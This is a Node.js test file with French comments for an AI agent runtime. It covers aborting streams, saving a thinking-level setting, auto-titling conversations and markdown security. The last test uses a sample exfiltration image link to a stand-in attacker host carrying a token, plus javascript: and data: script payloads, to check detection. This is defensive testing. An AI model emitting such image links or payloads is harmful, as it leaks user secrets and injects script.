import test from 'node:test';
import assert from 'node:assert/strict';

// Charger les modules compilés/TS via dynamic import tsx
const { MockProvider } = await import('../server/models/providers/MockProvider.ts');
const { AnthropicProvider } = await import('../server/models/providers/AnthropicProvider.ts');
const { OpenAIProvider } = await import('../server/models/providers/OpenAIProvider.ts');
const { GeminiProvider } = await import('../server/models/providers/GeminiProvider.ts');
const { AgentLoop } = await import('../server/runtime/AgentLoop.ts');
const { Planner } = await import('../server/runtime/Planner.ts');
const { PermissionEngine } = await import('../server/permissions/PermissionEngine.ts');
const { RuntimeDatabase } = await import('../server/storage/RuntimeDatabase.ts');

test('1. Arrêt réel : MockProvider s\'interrompt immédiatement sous AbortSignal', async () => {
  const provider = new MockProvider();
  const controller = new AbortController();

  const chunks = [];
  const generator = provider.generateStream({
    messages: [{ role: 'user', content: 'Demande de test longue' }],
    abortSignal: controller.signal
  }, 'test-key');

  let count = 0;
  for await (const chunk of generator) {
    chunks.push(chunk);
    count++;
    if (count === 3) {
      controller.abort(); // Interruption au bout de 3 chunks
    }
  }

  // Le flux complet produit une vingtaine de mots, l'interruption doit stopper la boucle bien avant
  assert.ok(chunks.length <= 5, `Le flux aurait dû s'arrêter rapidement lors de l'abort (reçu: ${chunks.length})`);
});

test('2. Arrêt réel : AgentLoop s\'interrompt proprement et conserve le texte partiel', async () => {
  const loop = new AgentLoop();
  const controller = new AbortController();
  const permissionEngine = new PermissionEngine();
  const events = [];

  const emitEvent = (ev) => events.push(ev);
  const planner = new Planner(emitEvent);
  const toolContext = {
    workspacePath: process.cwd(),
    sessionId: 'test-session-abort',
    permissionEngine,
    emitEvent
  };

  // Lancer en arrière-plan et avorter après 80ms
  setTimeout(() => {
    controller.abort();
  }, 80);

  const result = await loop.run('Analyse le projet et liste les fichiers', toolContext, planner, {
    preferredProviderId: 'mock',
    abortSignal: controller.signal
  });

  assert.equal(result.success, false, 'Le résultat doit indiquer l\'échec/annulation');
  assert.ok(events.some(e => e.type === 'status' && e.status === 'idle'), 'Un événement status: idle doit être émis');
});

test('3. Paliers de réflexion : Persistance dans RuntimeDatabase', () => {
  const db = new RuntimeDatabase(':memory:');

  // Par défaut vide
  assert.equal(db.getSetting('thinking_level'), null);

  // Enregistrement des paliers
  db.setSetting('thinking_level', 'low');
  assert.equal(db.getSetting('thinking_level'), 'low');

  db.setSetting('thinking_level', 'high');
  assert.equal(db.getSetting('thinking_level'), 'high');

  db.setSetting('thinking_level', 'disabled');
  assert.equal(db.getSetting('thinking_level'), 'disabled');
});

test('4. Titrage automatique : Dérivation propre de titre depuis le premier message', () => {
  const db = new RuntimeDatabase(':memory:');
  const convId = 'conv-test-title-auto';

  db.saveConversation(convId, 'Nouvelle discussion');

  const testPrompts = [
    { prompt: '### Ajoute une fonction de tri\nDeuxième ligne', expected: 'Ajoute une fonction de tri' },
    { prompt: '- Créer un composant bouton sobre', expected: 'Créer un composant bouton sobre' },
    { prompt: 'Un message très long qui dépasse largement la limite autorisée de quarante-cinq caractères pour vérifier la troncature avec ellipse', expected: 'Un message très long qui dépasse largement la…' }
  ];

  for (const { prompt, expected } of testPrompts) {
    const firstLine = prompt.split('\n')[0].replace(/^[#*\- ]+/, '').trim();
    const autoTitle = firstLine.length > 45 ? firstLine.slice(0, 45) + '…' : firstLine;
    assert.equal(autoTitle, expected);
  }
});

test('5. Sécurité Markdown : Détection des images distantes et blocage exfiltration', () => {
  const textWithImage = 'Voici un texte avec ![exfil](https://attacker.evil/leak?token=1234) et du texte après.';
  const imgRegex = /!\[(.*?)\]\((.*?)\)/;

  const match = textWithImage.match(imgRegex);
  assert.ok(match, 'L\'image markdown doit être détectée');
  assert.equal(match[1], 'exfil');
  assert.equal(match[2], 'https://attacker.evil/leak?token=1234');

  // Schémas malveillants
  const isDangerousScheme = (url) => /^(javascript|data|vbscript):/i.test(url.trim());
  assert.equal(isDangerousScheme('javascript:alert(1)'), true);
  assert.equal(isDangerousScheme('data:text/html,<script>evil()</script>'), true);
  assert.equal(isDangerousScheme('https://example.com'), false);
  assert.equal(isDangerousScheme('/local/path'), false);
});
